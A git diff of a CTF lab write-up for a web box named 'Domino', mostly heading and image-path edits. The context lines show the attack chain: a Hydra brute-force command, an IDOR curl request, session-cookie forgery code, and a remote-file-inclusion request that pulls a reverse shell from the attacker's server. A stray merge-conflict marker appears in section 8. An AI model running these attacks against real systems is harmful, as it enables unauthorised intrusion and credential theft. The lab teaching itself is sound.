@@ -1,10 +1,12 @@
 # Domino
 
+## Domino
+
 **Difficulty:** Medium **Category:** Web Exploitation, IDOR, Session Forgery, RFI, Privilege Escalation **Author:** Sabin (ninjax\_11) **Date:** July 2026
 
 ***
 
-## Overview
+### Overview
 
 Domino is a web-focused CTF box built around a fictional company portal, "NexusCorp." What makes it a good learning box is that no single vulnerability is fatal on its own — each small weakness hands you exactly the piece of information you need to attack the next layer. This writeup walks through the full chain step by step: **what I ran, why I ran it, how the command actually works, what it gave me back, and what that result told me to try next.**
 
@@ -12,7 +14,7 @@ Four flags are captured along the way. Their real values aren't shown — they'r
 
 ***
 
-## Table of Contents
+### Table of Contents
 
 1. [Reconnaissance — Finding What's Open](./#1-reconnaissance--finding-whats-open)
 2. [Enumeration — Mapping the Web App](./#2-enumeration--mapping-the-web-app)
@@ -30,7 +32,7 @@ Four flags are captured along the way. Their real values aren't shown — they'r
 
 ***
 
-## 1. Reconnaissance — Finding What's Open
+### 1. Reconnaissance — Finding What's Open
 
 **Why I started here:** before touching anything, I need to know what's actually reachable on the box. There's no point guessing at web paths if, say, only SSH is open.
 
@@ -61,7 +63,7 @@ PORT   STATE SERVICE VERSION
 
 ***
 
-## 2. Enumeration — Mapping the Web App
+### 2. Enumeration — Mapping the Web App
 
 **Why I did this:** the homepage only shows what the developers _want_ me to see. Real content — admin panels, backups, employee lists — usually lives at paths that aren't linked anywhere obvious. The only way to find them is to guess systematically using a wordlist, and to actually read every page that _is_ linked.
 
@@ -108,7 +110,7 @@ Separately, the login page itself linked to two pages worth reading before touch
 
 ***
 
-## 3. Reading the Leaked JavaScript
+### 3. Reading the Leaked JavaScript
 
 **Why I did this:** the README explicitly said the decryption key lives in `static/app.js`. Frontend JavaScript is sent in full to every visitor's browser, so anything in there — including any comments left by a developer — is effectively public.
 
@@ -133,7 +135,7 @@ _backupKey: 'N3xusK3y2024!!'
 
 ***
 
-## 4. Decrypting the Backup Config
+### 4. Decrypting the Backup Config
 
 **Why I did this:** I now have both pieces needed — the encrypted file from `/backup/config.enc`, and the key from `app.js`.
 
@@ -162,7 +164,7 @@ cat config_decrypted
 ![Screenshot:](screenshots/decrypt.jpg)
 ***
 
-## 5. Cracking Login Credentials with Hydra
+### 5. Cracking Login Credentials with Hydra
 
 **Why I did this:** I now had a list of valid usernames from `team.php`, and the login form itself was a plain POST request with a distinguishable failure message ("Invalid credentials"). That combination — real usernames plus a login form that responds differently to right vs. wrong passwords — is exactly what a password-spraying/brute-force tool needs. Rather than guessing manually, I let Hydra try a large common-password list against every known username at once.
 
@@ -189,11 +191,13 @@ hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-
 
 **What this tells me / what's next:** I now had a real, logged-in session as a low-privileged employee account, which is exactly what's needed to legitimately request a JWT from the API (rather than trying to bypass authentication entirely). From here, the API itself becomes the next target.
 
+
 ![Screenshot:](screenshots/hydra.jpg)
+
 
 ***
 
-## 6. Flag 1 — Breaking Access Control (IDOR)
+### 6. Flag 1 — Breaking Access Control (IDOR)
 
 **Why I did this:** now logged in as `sarah.johnson`, the dashboard exposed a way to obtain a JWT for the `/api/` routes via `/api/auth/token.php`. Once I had _any_ valid token — even scoped to a low-privileged account — the natural next question for any API is: **does the server check that I actually own the resource I'm asking for, or does it just check that my token is valid at all?** That distinction is the whole basis of an IDOR (Insecure Direct Object Reference) vulnerability, so it's always worth testing.
 
@@ -220,13 +224,11 @@ curl 'http://<target_ip>/api/users/profile.php?id=1' \
 
 **What this tells me / what's next:** the server never checked whether the `id` I asked for matched _my own_ account — only that my token was valid at all. This confirms an IDOR: any authenticated user can pull any other user's profile by changing one number. It also reveals the admin account's username (`laura.hayes`), useful for impersonating that account later.
 
-![Screenshot:](screenshots/.jpg)
-
 **Flag 1:** `THM{flag1}`
 
 ***
 
-## 7. Turning a File-Read Bug into a Secrets Leak
+### 7. Turning a File-Read Bug into a Secrets Leak
 
 **Why I did this:** the same `/api/` area exposes `files.php`, which reads a file from disk and returns its contents, given a `name` parameter and a valid JWT. Whenever an app hands you _any_ kind of arbitrary file-read primitive, the highest-value targets are always the application's own source code and config files.
 
@@ -258,13 +260,12 @@ setcookie('nexus_session', $cookie_data . '.' . $sig, ...);
 
 The cookie is just `base64(json) + "." + HMAC-SHA256(json, APP_SECRET)` — no server-side session table backing it. With the signing secret in hand, I can build a valid cookie for _any_ user entirely on my own machine.
 
-
-![Screenshot:](screenshots/config.jpg)
+![Screenshot:](../../.gitbook/assets/config.jpg)
 
 
 ***
 
-## 8. Flag 2 — Forging an Admin Session
+### 8. Flag 2 — Forging an Admin Session
 
 **Why I did this:** I now have the exact ingredients the server uses to trust a session — the admin's user ID (from the IDOR in step 6) and the signing secret (from step 7). Rather than looking for a password, I can construct a valid admin session myself.
 
@@ -289,16 +290,15 @@ print(forged_cookie)
 **Flag 2:** `THM{flag2}`
 
 
-![Screenshot:](screenshots/forgecookie.jpg)
-![Screenshot:](screenshots/adminprog.jpg)
-![Screenshot:](screenshots/adminco.png)
+![Screenshot:](<../../.gitbook/assets/forgecookie (1).jpg>) ![Screenshot:](<../../.gitbook/assets/adminprog (1).jpg>) ![Screenshot:](<../../.gitbook/assets/adminco (1).png>)
 
+\======= `![Screenshot: forged cookie set in browser dev tools]` `![Screenshot: admin panel access showing flag 2]` ![Screenshot:](../../.gitbook/assets/forgecookie.jpg) ![Screenshot:](../../.gitbook/assets/adminprog.jpg) ![Screenshot:](../../.gitbook/assets/adminco.png)
 
 
 
 ***
 
-## 9. Flag 3 — Turning File-Read into Code Execution
+### 9. Flag 3 — Turning File-Read into Code Execution
 
 **Why I did this:** With admin access confirmed, I wanted to test one more thing on `files.php` — what happens if `name` is a full URL instead of a local path. A file-read endpoint that also fetches remote URLs is a Remote File Inclusion (RFI) risk if the fetched PHP content gets executed rather than just displayed.
 
@@ -339,11 +339,11 @@ curl 'http://<ip>/api/files.php?name=http://:8000/reverse.php' \
 
 **Flag 3:** `THM{flag3}` _(found on disk after gaining a shell as www-data)_
 
-## `![Screenshot: reverse shell landing as www-data]` `![Screenshot: locating and reading flag 3 on disk]`
+### `![Screenshot: reverse shell landing as www-data]` `![Screenshot: locating and reading flag 3 on disk]`
 
 ![Screenshot:](../../.gitbook/assets/gotshell.jpg)
 
-## 10. Moving Sideways — www-data to devops
+### 10. Moving Sideways — www-data to devops
 
 **Why I did this:** `www-data` is a restricted service account. Checking `/etc/passwd` confirmed a real account, `devops` (the same name flagged back in step 4). The database password leaked in step 7 (`D3v0ps!2024`) is worth trying here — password reuse between an app's service credentials and a real system account is extremely common.
 
@@ -367,7 +367,7 @@ devops
 
 ***
 
-## 11. Flag 4 — Becoming Root via Cron
+### 11. Flag 4 — Becoming Root via Cron
 
 **Why I did this:** as a normal user, cron jobs running periodically as root are one of the highest-value, lowest-cost privilege escalation checks available. `pspy` observes process activity system-wide without needing any special privileges. Transfer the pspy from your device to the target ip using python server.
 
@@ -420,7 +420,7 @@ cat /root/root.txt
 
 ***
 
-## 12. Flags Summary
+### 12. Flags Summary
 
 | # | Where it was found              | How it was obtained                                 |
 | - | ------------------------------- | --------------------------------------------------- |
@@ -433,7 +433,7 @@ cat /root/root.txt
 
 ***
 
-## 13. Lessons Learned
+### 13. Lessons Learned
 
 * **Never expose employee names/emails on a public "team" page** without considering that it doubles as a username list for an attacker.
 * **Rate-limit or lock out login attempts.** Nothing here stopped a 7,000-attempt Hydra run from completing.
